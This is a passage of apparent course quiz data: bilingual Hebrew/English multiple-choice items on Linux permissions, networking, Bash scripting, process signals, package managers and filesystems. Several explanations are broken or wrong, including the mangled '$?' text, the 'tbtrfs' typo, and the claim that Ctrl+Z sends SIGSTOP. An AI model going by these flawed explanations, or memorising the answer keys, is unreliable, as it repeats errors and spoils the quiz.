      explanation: "‏ב-/tmp יש Sticky Bit (מסומן ב-t): drwxrwxrwt.\n\nעיקרי:\n- כולם יכולים ליצור קבצים שם, אבל רק הבעלים (או root) יכול למחוק קובץ שלו",
      explanationEn: "In /tmp there's a Sticky Bit (marked with t): drwxrwxrwt.\n\nMain Points:\n- Everyone can create files there, but only the owner (or root) can delete their own files",
      qEn: "What is the purpose of Sticky Bit and where is it used in practice?",
      correctEn: "Only the file owner (or root) can delete it\nExample: /tmp — everyone writes but can't delete others' files",
      choicesEn: [
        "Only the file owner (or root) can delete it\nExample: /tmp — everyone writes but can't delete others' files",
        "Prevents changing permissions on a file",
        "Hides a file from ls",
        "Keeps a file in memory"
      ]
    },
    {
      q: "\u200Fמה ההבדל בין UID 0 לבין UID 1000?",
      correct: "\u200FUID 0 = root (מנהל מערכת)\nUID 1000+ = משתמשים רגילים",
      choices: [
        "\u200FUID 0 = root (מנהל מערכת)\nUID 1000+ = משתמשים רגילים",
        "\u200FUID 0 = משתמש ראשון שנוצר\nUID 1000 = משתמש אלף",
        "\u200Fאין הבדל — שניהם משתמשים רגילים",
        "\u200FUID 0 = שירותי מערכת\nUID 1000 = root"
      ],
      explanation: "‏UID 0 שמור ל-root — מנהל המערכת עם הרשאות מלאות.\n\nעיקרי:\n- UIDs 1-999 לשירותי מערכת (daemon, www-data)\n- UIDs 1000+ למשתמשים רגילים",
      explanationEn: "UID 0 is reserved for root — the system administrator with full permissions.\n\nMain Points:\n- UIDs 1-999 are for system services (daemon, www-data)\n- UIDs 1000+ are for regular users",
      qEn: "What is the difference between UID 0 and UID 1000?",
      correctEn: "UID 0 = root (system administrator)\nUID 1000+ = regular users",
      choicesEn: [
        "UID 0 = root (system administrator)\nUID 1000+ = regular users",
        "UID 0 = first user created\nUID 1000 = user number thousand",
        "No difference — both are regular users",
        "UID 0 = system services\nUID 1000 = root"
      ]
    }
  ],

  404: [
    {
      q: "\u200Fאיזו פקודה מציגה את כל חיבורי הרשת הפעילים ואת התהליך שמשתמש בהם?",
      correct: "\u200Fsudo ss -tulnp",
      choices: [
        "\u200Fsudo ss -tulnp",
        "\u200Fip addr show",
        "\u200Fping -c 4 localhost",
        "\u200Ftraceroute localhost"
      ],
      explanation: "‏ss -tulnp: -t=TCP, -u=UDP, -l=LISTEN, -n=מספרי, -p=תהליך.\n\nעיקרי:\n- sudo נדרש כדי לראות תהליכים של משתמשים אחרים",
      explanationEn: "ss -tulnp: -t=TCP, -u=UDP, -l=LISTEN, -n=numeric, -p=process.\n\nMain Points:\n- sudo is needed to see other users' processes",
      qEn: "Which command shows all active network connections and the process using them?",
      correctEn: "sudo ss -tulnp",
      choicesEn: [
        "sudo ss -tulnp",
        "ip addr show",
        "ping -c 4 localhost",
        "traceroute localhost"
      ]
    },
    {
      q: "\u200Fמה היתרון של אימות SSH מבוסס מפתח על פני סיסמה?",
      correct: "\u200Fבטוח יותר — אי אפשר לנחש ב-brute force\nנוח יותר — לא צריך להקליד סיסמה",
      choices: [
        "\u200Fבטוח יותר — אי אפשר לנחש ב-brute force\nנוח יותר — לא צריך להקליד סיסמה",
        "\u200Fמפתח מהיר יותר מסיסמה",
        "\u200Fמפתח עובד רק ברשת מקומית",
        "\u200Fסיסמה בטוחה יותר ממפתח"
      ],
      explanation: "‏מפתח SSH הוא מחרוזת ארוכה מאוד שאי אפשר לנחש.\n\nעיקרי:\n- אפשר גם להגביל מי יכול להתחבר על ידי ניהול המפתחות הציבוריים בשרת",
      explanationEn: "An SSH key is a very long string that cannot be guessed.\n\nMain Points:\n- You can also control who can connect by managing public keys on the server",
      qEn: "What is the advantage of SSH key-based authentication over passwords?",
      correctEn: "More secure — cannot be brute-forced\nMore convenient — no need to type a password",
      choicesEn: [
        "More secure — cannot be brute-forced\nMore convenient — no need to type a password",
        "Key is faster than password",
        "Key only works on local network",
        "Password is more secure than key"
      ]
    },
    {
      q: "\u200Fמה ההבדל בין curl לבין wget?",
      correct: "\u200Fcurl — כלי רב-תכליתי לבקשות HTTP (GET, POST, PUT)\nwget — מתמחה בהורדות, תומך בהמשך הורדה ו-mirroring",
      choices: [
        "\u200Fcurl — כלי רב-תכליתי לבקשות HTTP (GET, POST, PUT)\nwget — מתמחה בהורדות, תומך בהמשך הורדה ו-mirroring",
        "\u200Fשניהם זהים לחלוטין",
        "\u200Fcurl עובד רק עם HTTPS\nwget עובד עם HTTP",
        "\u200Fcurl להורדות\nwget לבקשות API"
      ],
      explanation: "‏curl גמיש יותר — תומך בשיטות HTTP שונות, headers, authentication ועוד.\n\nעיקרי:\n- wget מתמחה בהורדות — תומך ב-wget -c (המשך הורדה) ו-wget -r (mirroring)",
      explanationEn: "curl is more flexible — supports different HTTP methods, headers, authentication, etc.\n\nMain Points:\n- wget specializes in downloads — supports wget -c (resume) and wget -r (mirroring)",
      qEn: "What is the difference between curl and wget?",
      correctEn: "curl — versatile tool for HTTP requests (GET, POST, PUT)\nwget — specializes in downloads, supports resume and mirroring",
      choicesEn: [
        "curl — versatile tool for HTTP requests (GET, POST, PUT)\nwget — specializes in downloads, supports resume and mirroring",
        "Both are completely identical",
        "curl works only with HTTPS\nwget works with HTTP",
        "curl for downloads\nwget for API requests"
      ]
    },
    {
      q: "\u200Fמה עושה הפקודה dig google.com?",
      correct: "\u200Fשולחת שאילתת DNS ומציגה את כתובת ה־IP של google.com\nכולל פרטים מלאים על הרשומה",
      choices: [
        "\u200Fשולחת שאילתת DNS ומציגה את כתובת ה־IP של google.com\nכולל פרטים מלאים על הרשומה",
        "\u200Fבודקת אם google.com זמין",
        "\u200Fמציגה את מסלול החבילות ל-google.com",
        "\u200Fמורידה את דף הבית של google.com"
      ],
      explanation: "‏dig (Domain Information Groper) שולח שאילתת DNS ומחזיר את כתובת ה־IP, TTL, סוג הרשומה ועוד.\n\nעיקרי:\n- dig @8.8.8.8 example.com משתמש ב־DNS server ספציפי",
      explanationEn: "dig (Domain Information Groper) sends a DNS query and returns the IP address, TTL, record type, and more.\n\nMain Points:\n- dig @8.8.8.8 example.com uses a specific DNS server",
      qEn: "What does the command dig google.com do?",
      correctEn: "Sends a DNS query and shows google.com's IP address\nincluding full record details",
      choicesEn: [
        "Sends a DNS query and shows google.com's IP address\nincluding full record details",
        "Checks if google.com is available",
        "Shows the packet route to google.com",
        "Downloads google.com's homepage"
      ]
    },
    {
      q: "\u200Fמה עושה הפקודה ip route show?",
      correct: "\u200Fמציגה את טבלת הניתוב — לאן המערכת שולחת חבילות רשת",
      choices: [
        "\u200Fמציגה את טבלת הניתוב — לאן המערכת שולחת חבילות רשת",
        "\u200Fמציגה את כל כתובות ה־IP במערכת",
        "\u200Fמציגה את מהירות חיבור הרשת",
        "\u200Fמציגה את היסטוריית החיבורים"
      ],
      explanation: "‏ip route show מציגה את טבלת הניתוב, כולל default gateway — הנתב שדרכו יוצאים לאינטרנט.\n\nעיקרי:\n- שורה כמו 'default via 192.168.1.1' אומרת שכל תעבורה לא-מקומית יוצאת דרך 192.168.1.1",
      explanationEn: "ip route show displays the routing table, including the default gateway — the router through which you reach the internet.\n\nMain Points:\n- A line like 'default via 192.168.1.1' means all non-local traffic goes through 192.168.1.1",
      qEn: "What does the command ip route show do?",
      correctEn: "Shows the routing table — where the system sends network packets",
      choicesEn: [
        "Shows the routing table — where the system sends network packets",
        "Shows all IP addresses on the system",
        "Shows the network connection speed",
        "Shows the connection history"
      ]
    }
  ],

  405: [
    {
      q: "\u200Fמה תפקיד שורת ה־Shebang (#!/bin/bash) בסקריפט?",
      correct: "\u200Fאומרת למערכת ההפעלה באיזה מפרש להריץ את הסקריפט",
      choices: [
        "\u200Fאומרת למערכת ההפעלה באיזה מפרש להריץ את הסקריפט",
        "\u200Fהערה שמתארת את מטרת הסקריפט",
        "\u200Fמגדירה משתנה סביבה",
        "\u200Fמפעילה מצב דיבוג"
      ],
      explanation: "‏#!/bin/bash אומר למערכת: 'הרץ את הסקריפט הזה עם Bash'.\n\nעיקרי:\n- אפשר גם #!/usr/bin/python3 לסקריפט פייתון, או #!/bin/sh ל-shell בסיסי",
      explanationEn: "#!/bin/bash tells the system: 'Run this script with Bash'.\n\nMain Points:\n- You can also use #!/usr/bin/python3 for Python scripts, or #!/bin/sh for basic shell",
      qEn: "What is the purpose of the Shebang line (#!/bin/bash) in a script?",
      correctEn: "Tells the operating system which interpreter to use to run the script",
      choicesEn: [
        "Tells the operating system which interpreter to use to run the script",
        "A comment describing the script's purpose",
        "Defines an environment variable",
        "Enables debug mode"
      ]
    },
    {
      q: "\u200Fמה ההבדל בין $@ לבין $# בסקריפט Bash?",
      correct: "\u200F$@ = כל הארגומנטים שהועברו\n$# = מספר הארגומנטים",
      choices: [
        "\u200F$@ = כל הארגומנטים שהועברו\n$# = מספר הארגומנטים",
        "\u200F$@ = מספר הארגומנטים\n$# = כל הארגומנטים",
        "\u200F$@ = שם הסקריפט\n$# = קוד החזרה",
        "\u200Fשניהם מציגים את כל הארגומנטים"
      ],
      explanation: "‏אם מריצים ./script.sh a b c\n\nעיקרי:\n- $@ = 'a b c'\n- $# = 3\n- $1 = 'a'",
      explanationEn: "If running ./script.sh a b c: $@ = 'a b c', $# = 3, $1 = 'a', $0 = './script.sh'..\n\nMain Points:\n- If running ./script.sh a b c: $@ = 'a b c', $# = 3, $1 = 'a'",
      qEn: "What is the difference between $@ and $# in a Bash script?",
      correctEn: "$@ = all arguments passed\n$# = number of arguments",
      choicesEn: [
        "$@ = all arguments passed\n$# = number of arguments",
        "$@ = number of arguments\n$# = all arguments",
        "$@ = script name\n$# = return code",
        "Both display all arguments"
      ]
    },
    {
      q: "\u200Fמה בודק הדגל -f בתנאי [[ -f \"$FILE\" ]]?",
      correct: "\u200Fשהנתיב קיים והוא קובץ רגיל (לא תיקייה)",
      choices: [
        "\u200Fשהנתיב קיים והוא קובץ רגיל (לא תיקייה)",
        "\u200Fשהקובץ ריק",
        "\u200Fשהקובץ ניתן להרצה",
        "\u200Fשהקובץ שונה לאחרונה"
      ],
      explanation: "‏-f בודק שהנתיב קיים וזה קובץ רגיל.\n\nעיקרי:\n- -d לתיקייה, -e לקיום כלשהו, -s שלא ריק, -r שקריא, -x שניתן להרצה",
      explanationEn: "f checks that the path exists and is a regular file.\n\nMain Points:\n- -d for directory, -e for any existence, -s for non-empty, -r for readable, -x for executable",
      qEn: "What does the -f flag check in the condition [[ -f \"$FILE\" ]]?",
      correctEn: "That the path exists and is a regular file (not a directory)",
      choicesEn: [
        "That the path exists and is a regular file (not a directory)",
        "That the file is empty",
        "That the file is executable",
        "That the file was recently modified"
      ]
    },
    {
      q: "\u200Fמה עושה המילה local בתוך פונקציה ב־Bash?",
      correct: "\u200Fמגדירה משתנה מקומי לפונקציה\nבלי local — המשתנה גלובלי ונגיש מכל מקום",
      choices: [
        "\u200Fמגדירה משתנה מקומי לפונקציה\nבלי local — המשתנה גלובלי ונגיש מכל מקום",
        "\u200Fמגדירה משתנה קבוע שלא ניתן לשינוי",
        "\u200Fמייצאת משתנה לסביבה",
        "\u200Fמוחקת משתנה"
      ],
      explanation: "‏בלי local, משתנה שנוצר בפונקציה נגיש מכל מקום בסקריפט ויכול לדרוס משתנים אחרים.\n\nעיקרי:\n- עם local — קיים רק בתוך הפונקציה",
      explanationEn: "Without local, a variable created in a function is accessible everywhere in the script and can overwrite other variables.\n\nMain Points:\n- With local — it exists only inside the function",
      qEn: "What does the 'local' keyword do inside a Bash function?",
      correctEn: "Defines a variable local to the function\nWithout local — the variable is global and accessible everywhere",
      choicesEn: [
        "Defines a variable local to the function\nWithout local — the variable is global and accessible everywhere",
        "Defines a constant variable that cannot be changed",
        "Exports a variable to the environment",
        "Deletes a variable"
      ]
    },
    {
      q: "\u200Fמה מחזיר $? אחרי הרצת פקודה?",
      correct: "\u200Fאת קוד החזרה של הפקודה האחרונה\n0 = הצלחה, כל ערך אחר = כישלון",
      choices: [
        "\u200Fאת קוד החזרה של הפקודה האחרונה\n0 = הצלחה, כל ערך אחר = כישלון",
        "\u200Fאת ה־PID של הפקודה האחרונה",
        "\u200Fאת הפלט של הפקודה האחרונה",
        "\u200Fאת שם הפקודה האחרונה"
      ],
      explanation: "‏לאחר כל פקודה, $.\n\nעיקרי:\n- מכיל את קוד היציאה\n- 0 = הצלחה\n- למשל: grep 'text' file.txt; echo $",
      explanationEn: "After every command, $.\n\nMain Points:\n- contains the exit code\n- 0 = success\n- For example: grep 'text' file.txt; echo $",
      qEn: "What does $? return after running a command?",
      correctEn: "The exit code of the last command\n0 = success, any other value = failure",
      choicesEn: [
        "The exit code of the last command\n0 = success, any other value = failure",
        "The PID of the last command",
        "The output of the last command",
        "The name of the last command"
      ]
    }
  ],

  406: [
    {
      q: "\u200Fמה ההבדל בין SIGTERM (15) לבין SIGKILL (9)?",
      correct: "\u200FSIGTERM מבקש מהתהליך להסתיים בסדר (יכול לנקות)\nSIGKILL הורג מיידית (בלי אפשרות לנקות)",
      choices: [
        "\u200FSIGTERM מבקש מהתהליך להסתיים בסדר (יכול לנקות)\nSIGKILL הורג מיידית (בלי אפשרות לנקות)",
        "\u200FSIGTERM הורג מיידית\nSIGKILL מבקש בעדינות",
        "\u200Fשניהם עושים את אותו הדבר",
        "\u200FSIGTERM לתהליכי מערכת\nSIGKILL למשתמש"
      ],
      explanation: "‏תמיד נסו kill PID (SIGTERM) קודם — נותן לתהליך לסגור חיבורים ולשמור נתונים.\n\nעיקרי:\n- רק אם לא מגיב — kill -9 PID (SIGKILL)",
      explanationEn: "Always try kill PID (SIGTERM) first — lets the process close connections and save data.\n\nMain Points:\n- Only if unresponsive — kill -9 PID (SIGKILL)",
      qEn: "What is the difference between SIGTERM (15) and SIGKILL (9)?",
      correctEn: "SIGTERM asks the process to terminate gracefully (can clean up)\nSIGKILL kills immediately (no chance to clean up)",
      choicesEn: [
        "SIGTERM asks the process to terminate gracefully (can clean up)\nSIGKILL kills immediately (no chance to clean up)",
        "SIGTERM kills immediately\nSIGKILL asks gently",
        "Both do the same thing",
        "SIGTERM for system processes\nSIGKILL for user processes"
      ]
    },
    {
      q: "\u200Fמה עושה nohup ולמה צריך אותו?",
      correct: "\u200Fמונע מתהליך ברקע להיהרג כשסוגרים Terminal\nבלעדיו, התהליך מקבל SIGHUP ומסתיים",
      choices: [
        "\u200Fמונע מתהליך ברקע להיהרג כשסוגרים Terminal\nבלעדיו, התהליך מקבל SIGHUP ומסתיים",
        "\u200Fמריץ תהליך בעדיפות גבוהה",
        "\u200Fמגביל את צריכת הזיכרון של תהליך",
        "\u200Fמונע מתהליך לכתוב לדיסק"
      ],
      explanation: "‏nohup python script.py > log.txt 2>&1 & — ירוץ ברקע וימשיך גם אחרי התנתקות מ־SSH.\n\nעיקרי:\n- הפלט נשמר ב-log.txt",
      explanationEn: "nohup python script.py > log.txt 2>&1 & — runs in background and continues even after SSH disconnect.\n\nMain Points:\n- Output is saved to log.txt",
      qEn: "What does nohup do and why is it needed?",
      correctEn: "Prevents a background process from being killed when Terminal closes\nWithout it, the process receives SIGHUP and terminates",
      choicesEn: [
        "Prevents a background process from being killed when Terminal closes\nWithout it, the process receives SIGHUP and terminates",
        "Runs a process with high priority",
        "Limits a process's memory usage",
        "Prevents a process from writing to disk"
      ]
    },
    {
      q: "\u200Fאיך מגדירים שירות שיעלה אוטומטית בעליית המערכת?",
      correct: "\u200Fsudo systemctl enable service-name",
      choices: [
        "\u200Fsudo systemctl enable service-name",
        "\u200Fsudo systemctl start service-name",
        "\u200Fsudo systemctl restart service-name",
        "\u200Fsudo systemctl reload service-name"
      ],
      explanation: "‏enable יוצר symlink שגורם ל-systemd להפעיל את השירות אוטומטית ב-boot.\n\nעיקרי:\n- start מפעיל עכשיו (לא שומר ל-boot)\n- disable מבטל את ההפעלה האוטומטית",
      explanationEn: "enable creates a symlink that causes systemd to start the service automatically at boot.\n\nMain Points:\n- start launches now (doesn't persist)\n- disable cancels auto-start",
      qEn: "How do you configure a service to start automatically on system boot?",
      correctEn: "sudo systemctl enable service-name",
      choicesEn: [
        "sudo systemctl enable service-name",
        "sudo systemctl start service-name",
        "sudo systemctl restart service-name",
        "sudo systemctl reload service-name"
      ]
    },
    {
      q: "\u200Fמה עושה הפקודה journalctl -u nginx -f?",
      correct: "\u200Fמציגה את הלוגים של שירות nginx במעקב חי (real-time)",
      choices: [
        "\u200Fמציגה את הלוגים של שירות nginx במעקב חי (real-time)",
        "\u200Fמפעילה מחדש את שירות nginx",
        "\u200Fמציגה את קובץ ההגדרות של nginx",
        "\u200Fמוחקת את הלוגים של nginx"
      ],
      explanation: "‏journalctl -u nginx מסנן לוגים של nginx בלבד.\n\nעיקרי:\n- -f (follow) מציג שורות חדשות בזמן אמת — כמו tail -f\n- שימושי לדיבוג בעיות בשירותים",
      explanationEn: "journalctl -u nginx filters logs for nginx only.\n\nMain Points:\n- -f (follow) shows new lines in real-time — like tail -f\n- Useful for debugging service issues",
      qEn: "What does the command journalctl -u nginx -f do?",
      correctEn: "Shows nginx service logs in real-time (live follow)",
      choicesEn: [
        "Shows nginx service logs in real-time (live follow)",
        "Restarts the nginx service",
        "Shows the nginx configuration file",
        "Deletes nginx logs"
      ]
    },
    {
      q: "\u200Fמה ההבדל בין Ctrl+Z לבין Ctrl+C?",
      correct: "\u200FCtrl+Z מקפיא (suspend) את התהליך\nCtrl+C שולח SIGINT ועוצר אותו",
      choices: [
        "\u200FCtrl+Z מקפיא (suspend) את התהליך\nCtrl+C שולח SIGINT ועוצר אותו",
        "\u200Fשניהם עוצרים את התהליך",
        "\u200FCtrl+Z עוצר\nCtrl+C מקפיא",
        "\u200FCtrl+Z סוגר Terminal\nCtrl+C מנקה מסך"
      ],
      explanation: "‏Ctrl+Z שולח SIGSTOP — התהליך מוקפא אבל עדיין קיים.\n\nעיקרי:\n- אפשר להחזיר אותו עם fg (חזית) או bg (רקע)\n- Ctrl+C שולח SIGINT — בדרך כלל מסיים את התהליך",
      explanationEn: "Ctrl+Z sends SIGSTOP — the process is frozen but still exists.\n\nMain Points:\n- You can resume with fg (foreground) or bg (background)\n- Ctrl+C sends SIGINT — usually terminates the process",
      qEn: "What is the difference between Ctrl+Z and Ctrl+C?",
      correctEn: "Ctrl+Z suspends (freezes) the process\nCtrl+C sends SIGINT and stops it",
      choicesEn: [
        "Ctrl+Z suspends (freezes) the process\nCtrl+C sends SIGINT and stops it",
        "Both stop the process",
        "Ctrl+Z stops\nCtrl+C freezes",
        "Ctrl+Z closes Terminal\nCtrl+C clears screen"
      ]
    }
  ],

  407: [
    {
      q: "\u200Fמה ההבדל בין apt update לבין apt upgrade?",
      correct: "\u200Fapt update מעדכן את רשימת החבילות הזמינות\napt upgrade מתקין גרסאות חדשות של חבילות מותקנות",
      choices: [
        "\u200Fapt update מעדכן את רשימת החבילות הזמינות\napt upgrade מתקין גרסאות חדשות של חבילות מותקנות",
        "\u200Fשניהם מתקינים עדכונים",
        "\u200Fapt update מתקין חבילות\napt upgrade מעדכן רשימות",
        "\u200Fapt update לחבילות חדשות\napt upgrade למערכת ההפעלה"
      ],
      explanation: "‏apt update מוריד את רשימת החבילות העדכנית מהמאגרים — לא מתקין כלום.\n\nעיקרי:\n- apt upgrade משתמש ברשימה הזו כדי לשדרג חבילות שכבר מותקנות",
      explanationEn: "apt update downloads the latest package list from repositories — installs nothing.\n\nMain Points:\n- apt upgrade uses that list to upgrade already installed packages",
      qEn: "What is the difference between apt update and apt upgrade?",
      correctEn: "apt update refreshes the list of available packages\napt upgrade installs new versions of installed packages",
      choicesEn: [
        "apt update refreshes the list of available packages\napt upgrade installs new versions of installed packages",
        "Both install updates",
        "apt update installs packages\napt upgrade refreshes lists",
        "apt update for new packages\napt upgrade for the OS"
      ]
    },
    {
      q: "\u200Fמה ההבדל בין apt remove לבין apt purge?",
      correct: "\u200Fremove מסיר את התוכנה\npurge מסיר גם את קבצי ההגדרות",
      choices: [
        "\u200Fremove מסיר את התוכנה\npurge מסיר גם את קבצי ההגדרות",
        "\u200Fשניהם מסירים הכל",
        "\u200Fremove מסיר את ההגדרות\npurge מסיר את התוכנה",
        "\u200Fremove לחבילות קטנות\npurge לחבילות גדולות"
      ],
      explanation: "‏apt remove nginx מסיר את nginx אבל משאיר קבצי הגדרות ב-/etc/nginx.\n\nעיקרי:\n- apt purge nginx מסיר גם את ההגדרות — התקנה נקייה אחר כך",
      explanationEn: "apt remove nginx removes nginx but leaves config files in /etc/nginx.\n\nMain Points:\n- apt purge nginx removes configs too — for a clean reinstall later",
      qEn: "What is the difference between apt remove and apt purge?",
      correctEn: "remove removes the software\npurge also removes configuration files",
      choicesEn: [
        "remove removes the software\npurge also removes configuration files",
        "Both remove everything",
        "remove removes configs\npurge removes the software",
        "remove for small packages\npurge for large packages"
      ]
    },
    {
      q: "\u200Fמה היתרון של snap/flatpak על פני apt/dnf?",
      correct: "\u200Fחבילות אוניברסליות שעובדות על כל הפצה\nכל חבילה כוללת את כל ה-dependencies — בלי קונפליקטים",
      choices: [
        "\u200Fחבילות אוניברסליות שעובדות על כל הפצה\nכל חבילה כוללת את כל ה-dependencies — בלי קונפליקטים",
        "\u200Fקטנות יותר וצורכות פחות זיכרון",
        "\u200Fמהירות יותר להתקנה",
        "\u200Fבטוחות יותר מחבילות רגילות"
      ],
      explanation: "‏snap ו-flatpak עובדות על Ubuntu, Fedora, Debian ועוד — ללא תלות בהפצה.\n\nעיקרי:\n- החיסרון: גודל גדול יותר וצריכת זיכרון גבוהה כי כל חבילה כוללת את כל מה שהיא צריכה",
      explanationEn: "snap and flatpak work on Ubuntu, Fedora, Debian, and more — independent of distribution.\n\nMain Points:\n- Downside: larger size and higher memory usage because each package includes everything it needs",
      qEn: "What is the advantage of snap/flatpak over apt/dnf?",
      correctEn: "Universal packages that work on any distribution\nEach package includes all dependencies — no conflicts",
      choicesEn: [
        "Universal packages that work on any distribution\nEach package includes all dependencies — no conflicts",
        "Smaller and use less memory",
        "Faster to install",
        "More secure than regular packages"
      ]
    },
    {
      q: "\u200Fמה עושה ./configure בתהליך בנייה מקוד מקור?",
      correct: "\u200Fבודק שהמערכת מכילה את כל ה-dependencies\nויוצר Makefile מותאם למערכת הנוכחית",
      choices: [
        "\u200Fבודק שהמערכת מכילה את כל ה-dependencies\nויוצר Makefile מותאם למערכת הנוכחית",
        "\u200Fמקמפל את הקוד",
        "\u200Fמתקין את התוכנה",
        "\u200Fמוריד את קוד המקור"
      ],
      explanation: "‏./configure → make → sudo make install.\n\nעיקרי:\n- configure בודק dependencies ויוצר Makefile\n- make מקמפל\n- make install מעתיק קבצים מקומפלים למערכת",
      explanationEn: "./configure → make → sudo make install.\n\nMain Points:\n- configure checks dependencies and creates Makefile\n- make compiles\n- make install copies compiled files to the system",
      qEn: "What does ./configure do in the source build process?",
      correctEn: "Checks that the system has all dependencies\nand creates a Makefile tailored to the current system",
      choicesEn: [
        "Checks that the system has all dependencies\nand creates a Makefile tailored to the current system",
        "Compiles the code",
        "Installs the software",
        "Downloads the source code"
      ]
    },
    {
      q: "\u200Fמה ההבדל בין פורמט .deb לבין .rpm?",
      correct: "\u200F.deb = חבילות של Debian/Ubuntu (apt)\n.rpm = חבילות של Red Hat/CentOS (dnf/yum)",
      choices: [
        "\u200F.deb = חבילות של Debian/Ubuntu (apt)\n.rpm = חבילות של Red Hat/CentOS (dnf/yum)",
        "\u200F.deb לתוכנות גדולות\n.rpm לתוכנות קטנות",
        "\u200F.deb חדש יותר מ-.rpm",
        "\u200Fשניהם עובדים על כל הפצה"
      ],
      explanation: "‏הפורמטים לא תואמים — חבילת .deb לא תעבוד על CentOS ולהפך.\n\nעיקרי:\n- לכן snap ו-flatpak נוצרו כפתרון אוניברסלי",
      explanationEn: "The formats are incompatible — a .deb package won't work on CentOS and vice versa.\n\nMain Points:\n- That's why snap and flatpak were created as universal solutions",
      qEn: "What is the difference between .deb and .rpm formats?",
      correctEn: ".deb = Debian/Ubuntu packages (apt)\n.rpm = Red Hat/CentOS packages (dnf/yum)",
      choicesEn: [
        ".deb = Debian/Ubuntu packages (apt)\n.rpm = Red Hat/CentOS packages (dnf/yum)",
        ".deb for large software\n.rpm for small software",
        ".deb is newer than .rpm",
        "Both work on any distribution"
      ]
    }
  ],

  408: [
    {
      q: "\u200Fמה ההבדל בין df לבין du?",
      correct: "\u200Fdf מציג שטח פנוי בכל מערכת קבצים (תמונה כללית)\ndu מציג כמה שטח תיקייה ספציפית תופסת",
      choices: [
        "\u200Fdf מציג שטח פנוי בכל מערכת קבצים (תמונה כללית)\ndu מציג כמה שטח תיקייה ספציפית תופסת",
        "\u200Fdf לקבצים\ndu לתיקיות",
        "\u200Fdf מציג גדלים ב־GB\ndu מציג ב-bytes",
        "\u200Fשניהם מציגים את אותו מידע"
      ],
      explanation: "‏df -h מראה את כל ה-mount points וכמה שטח תפוס/פנוי בכל אחד.\n\nעיקרי:\n- du -sh /var/log מראה כמה /var/log תופס בדיוק",
      explanationEn: "df -h shows all mount points and how much space is used/free on each.\n\nMain Points:\n- du -sh /var/log shows exactly how much /var/log occupies",
      qEn: "What is the difference between df and du?",
      correctEn: "df shows free space on every filesystem (overview)\ndu shows how much space a specific directory occupies",
      choicesEn: [
        "df shows free space on every filesystem (overview)\ndu shows how much space a specific directory occupies",
        "df for files\ndu for directories",
        "df shows sizes in GB\ndu shows in bytes",
        "Both show the same information"
      ]
    },
    {
      q: "\u200Fלמה עדיף להשתמש ב־UUID ולא ב-/dev/sda1 בקובץ fstab?",
      correct: "\u200FUUID לא משתנה גם אם סדר הדיסקים משתנה\n/dev/sdX יכול להתחלף בהוספת דיסק",
      choices: [
        "\u200FUUID לא משתנה גם אם סדר הדיסקים משתנה\n/dev/sdX יכול להתחלף בהוספת דיסק",
        "\u200FUUID מהיר יותר",
        "\u200FUUID קצר יותר לכתיבה",
        "\u200F/dev/sda1 לא נתמך ב-fstab"
      ],
      explanation: "‏אם מוסיפים דיסק חדש, /dev/sda יכול להפוך ל-/dev/sdb.\n\nעיקרי:\n- UUID ייחודי ולא משתנה — כך המערכת תמיד עוגנת את הדיסק הנכון\n- blkid מציג UUIDs",
      explanationEn: "If a new disk is added, /dev/sda can become /dev/sdb.\n\nMain Points:\n- UUID is unique and doesn't change — so the system always mounts the correct disk\n- blkid shows UUIDs",
      qEn: "Why is it better to use UUID instead of /dev/sda1 in fstab?",
      correctEn: "UUID doesn't change even if disk order changes\n/dev/sdX can swap when adding a disk",
      choicesEn: [
        "UUID doesn't change even if disk order changes\n/dev/sdX can swap when adding a disk",
        "UUID is faster",
        "UUID is shorter to type",
        "/dev/sda1 is not supported in fstab"
      ]
    },
    {
      q: "\u200Fמה ההבדל בין ext4 לבין xfs?",
      correct: "\u200Fext4 — ברירת מחדל יציבה, טוב לשימוש כללי\nxfs — ביצועים גבוהים עם קבצים גדולים ומסדי נתונים",
      choices: [
        "\u200Fext4 — ברירת מחדל יציבה, טוב לשימוש כללי\nxfs — ביצועים גבוהים עם קבצים גדולים ומסדי נתונים",
        "\u200Fext4 חדש יותר מ-xfs",
        "\u200Fxfs תומך ב-journaling ו-ext4 לא",
        "\u200Fאין הבדל מעשי ביניהם"
      ],
      explanation: "‏ext4 יציב ונתמך בכל מקום — מתאים לשימוש כללי.\n\nעיקרי:\n- xfs מצטיין בכתיבה מקבילית ובנפחים גדולים — מתאים למסדי נתונים ומדיה\n- שניהם תומכים ב-journaling",
      explanationEn: "ext4 is stable and supported everywhere — good for general use.\n\nMain Points:\n- xfs excels at parallel writing and large volumes — good for databases and media\n- Both support journaling",
      qEn: "What is the difference between ext4 and xfs?",
      correctEn: "ext4 — stable default, good for general use\nxfs — high performance with large files and databases",
      choicesEn: [
        "ext4 — stable default, good for general use\nxfs — high performance with large files and databases",
        "ext4 is newer than xfs",
        "xfs supports journaling and ext4 doesn't",
        "No practical difference between them"
      ]
    },
    {
      q: "\u200Fמה עושה הפקודה mount -a?",
      correct: "\u200Fעוגנת את כל מערכות הקבצים שמוגדרות ב-/etc/fstab",
      choices: [
        "\u200Fעוגנת את כל מערכות הקבצים שמוגדרות ב-/etc/fstab",
        "\u200Fמנתקת את כל מערכות הקבצים",
        "\u200Fמציגה את כל ה-mounts הפעילים",
        "\u200Fיוצרת מערכת קבצים חדשה"
      ],
      explanation: "‏mount -a קוראת את /etc/fstab ועוגנת כל מה שלא עגון עדיין.\n\nעיקרי:\n- שימושי לבדיקה אחרי עריכת fstab — בלי reboot",
      explanationEn: "mount -a reads /etc/fstab and mounts everything not yet mounted.\n\nMain Points:\n- Useful for testing after editing fstab — without rebooting",
      qEn: "What does the command mount -a do?",
      correctEn: "Mounts all filesystems defined in /etc/fstab",
      choicesEn: [
        "Mounts all filesystems defined in /etc/fstab",
        "Unmounts all filesystems",
        "Shows all active mounts",
        "Creates a new filesystem"
      ]
    },
    {
      q: "\u200Fמה מיוחד במערכת קבצים btrfs לעומת ext4?",
      correct: "\u200Ftbtrfs תומך ב-snapshots, דחיסה מובנית ו־RAID מובנה",
      choices: [
        "\u200Ftbtrfs תומך ב-snapshots, דחיסה מובנית ו־RAID מובנה",
        "\u200Fbtrfs מהיר יותר בהרבה",
        "\u200Fbtrfs תומך בקבצים גדולים יותר",
        "\u200Fbtrfs יציב יותר"
      ],
      explanation: "‏btrfs מספק snapshots — תמונות מצב שאפשר לחזור אליהן, דחיסה שחוסכת מקום, ו־RAID בלי כלים נוספים.\n\nעיקרי:\n- מתאים ל־Homelab ו־NAS",
      explanationEn: "btrfs provides snapshots — state images you can roll back to, compression that saves space, and RAID without additional tools.\n\nMain Points:\n- Suitable for Homelab and NAS",
      qEn: "What is special about the btrfs filesystem compared to ext4?",
      correctEn: "btrfs supports snapshots, built-in compression, and built-in RAID",
      choicesEn: [
